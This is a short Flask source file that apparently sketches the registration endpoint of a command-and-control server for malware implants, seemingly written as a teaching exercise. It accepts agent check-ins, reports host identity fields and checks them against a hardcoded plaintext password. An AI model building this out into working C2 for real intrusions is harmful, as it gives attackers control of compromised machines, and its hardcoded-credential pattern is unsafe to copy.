from flask import Flask , request, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__) # use this to generate routes and handlers

password = "ch0nky"

def verify_password(reg_password):
    """
        verify the password
        TODO: need a safer way to verify the password
    """
    return reg_password == password

# the following is a route
# think of this as a subpage
# e.g. 127.0.0.1/register_agent
@app.route('/register_agent', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    # print(request.json) # this will be how we are getting data from implant
    reg_data = request.json # storing registration data
    reg_password = reg_data["password"]
    reg_whoami = reg_data["whoami"]
    reg_agent_id = reg_data["agent_id"]

    if verify_password(reg_password):
        print("[+] C2: a new agent has successfully registered")
        return jsonify({"status": "ok"})
    else:
        # print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})
    return "[-] C2: something went wrong"

if __name__ == '__main__':
    app.run()